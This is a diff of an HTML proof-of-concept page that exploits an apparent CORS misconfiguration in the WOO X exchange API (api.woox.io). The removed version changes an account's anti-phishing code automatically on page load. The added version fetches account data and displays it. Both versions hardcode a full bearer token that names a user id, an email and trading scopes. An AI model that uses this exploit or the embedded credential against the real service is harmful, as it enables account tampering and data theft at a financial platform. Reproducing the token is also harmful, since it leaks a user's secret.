@@ -3,40 +3,38 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CORS Test PoC</title>
-    <script>
-        function sendRequest() {
-            const url = 'https://api.woox.io/woo/account/anti_phishing_code';
-            const payload = {
-                "anti_phishing_code": "1111",
-                "code": ""
-            };
-
-            fetch(url, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json;charset=utf-8',
-                    'Authorization': 'Bearer eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJzeW1leGFtZUBjeWNsZWxvdmUuY2MiLCJyYW5kb20iOiJreEVHakkiLCJhdXRoX3R5cGUiOiIxIiwidXNlcl9pZCI6MjUyNjQwLCJzY29wZXMiOiJhc3NldCxvcmRlcmJvb2ssb3JkZXI6aW9jLG9yZGVyOmZvayxvcmRlcjpsaW1pdCxvcmRlcjptYXJrZXQsb3JkZXI6cG9zdG9ubHksdHJhZGUsc2VjdXJpdHksb3JkZXI6YXNrLG9yZGVyOmJpZCx0cmFkaW5nIiwiZXhwaXJlX2luIjo2MDQ4MDAsInZlcnNpb24iOjE2LCJjbGllbnRfaWQiOiJiZDkzZDQxMS0yYmFkLTQ1MmUtODlhOS0wMDQ5MzNjOThiYTQiLCJleHAiOjE3MzY4NjU1MTksImlzcyI6IldPT1RSQURFIiwiaWF0IjoxNzM2MjYwNzE5fQ.hWuodLDaArogthX7_5WnM5v3S76L61Vt153JRRK8hsGYmUN3pwyEhX23aP9dD-_ZbM7ljmJ43NxibsBnYL5WGvmea_oXRjxuNNoKkLxCFdG9sbmoYFyWsnO30oegULvSQeujK-4kX_xKCRdweIqjFBKkSBS-hE6XDy8kAIfK3UsF1WWUdb_8ztw3zSPC3dh-vYBv1Fz04LOXLE7EvfGCKksQ_nojnXaaqORC7KHfiXXH_lS6uZ3KV3LSYOYEc_6Vd6BCz-eNeJULtbLoyDECCm8OpatiG_a5a-n4L4gP6CMwTucdRthehDv3qQpgzlUgT5xImvLoBMMYCplrnSlGog', // Replace with the actual Bearer token
-                    'Origin': 'https://varad4-0-4.github.io/covid19partnersplatform-dev/', // Simulating an origin from GitHub
-                },
-                body: JSON.stringify(payload),
-            })
-            .then(response => response.json())
-            .then(data => {
-                console.log('Response:', data);
-            })
-            .catch(error => {
-                console.error('Error:', error);
-            });
-        }
-
-        window.onload = function() {
-            sendRequest();
-        };
-    </script>
+    <title>CORS Exploit PoC</title>
 </head>
 <body>
-    <h1>CORS Test PoC</h1>
-    <p>If the CORS misconfiguration is present, you should see a response in the console.</p>
+    <h1>CORS Exploit PoC</h1>
+    <p>Click the button below to fetch sensitive data from the vulnerable API.</p>
+    <button id="fetchData">Fetch Data</button>
+    <h2>Response:</h2>
+    <pre id="response"></pre>
+
+    <script>
+        document.getElementById('fetchData').addEventListener('click', function () {
+            // Exploit the CORS misconfiguration
+            fetch("https://api.woox.io/woo/account", {
+                method: "GET",
+                headers: {
+                    "Auth": "Bearer eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJzeW1leGFtZUBjeWNsZWxvdmUuY2MiLCJyYW5kb20iOiJreEVHakkiLCJhdXRoX3R5cGUiOiIxIiwidXNlcl9pZCI6MjUyNjQwLCJzY29wZXMiOiJhc3NldCxvcmRlcmJvb2ssb3JkZXI6aW9jLG9yZGVyOmZvayxvcmRlcjpsaW1pdCxvcmRlcjptYXJrZXQsb3JkZXI6cG9zdG9ubHksdHJhZGUsc2VjdXJpdHksb3JkZXI6YXNrLG9yZGVyOmJpZCx0cmFkaW5nIiwiZXhwaXJlX2luIjo2MDQ4MDAsInZlcnNpb24iOjE2LCJjbGllbnRfaWQiOiJiZDkzZDQxMS0yYmFkLTQ1MmUtODlhOS0wMDQ5MzNjOThiYTQiLCJleHAiOjE3MzY4NjU1MTksImlzcyI6IldPT1RSQURFIiwiaWF0IjoxNzM2MjYwNzE5fQ.hWuodLDaArogthX7_5WnM5v3S76L61Vt153JRRK8hsGYmUN3pwyEhX23aP9dD-_ZbM7ljmJ43NxibsBnYL5WGvmea_oXRjxuNNoKkLxCFdG9sbmoYFyWsnO30oegULvSQeujK-4kX_xKCRdweIqjFBKkSBS-hE6XDy8kAIfK3UsF1WWUdb_8ztw3zSPC3dh-vYBv1Fz04LOXLE7EvfGCKksQ_nojnXaaqORC7KHfiXXH_lS6uZ3KV3LSYOYEc_6Vd6BCz-eNeJULtbLoyDECCm8OpatiG_a5a-n4L4gP6CMwTucdRthehDv3qQpgzlUgT5xImvLoBMMYCplrnSlGog"
+                }
+            })
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error(`HTTP error! Status: ${response.status}`);
+                }
+                return response.json();
+            })
+            .then(data => {
+                // Display the sensitive response data on the page
+                document.getElementById('response').textContent = JSON.stringify(data, null, 2);
+            })
+            .catch(error => {
+                document.getElementById('response').textContent = `Error: ${error}`;
+            });
+        });
+    </script>
 </body>
 </html>
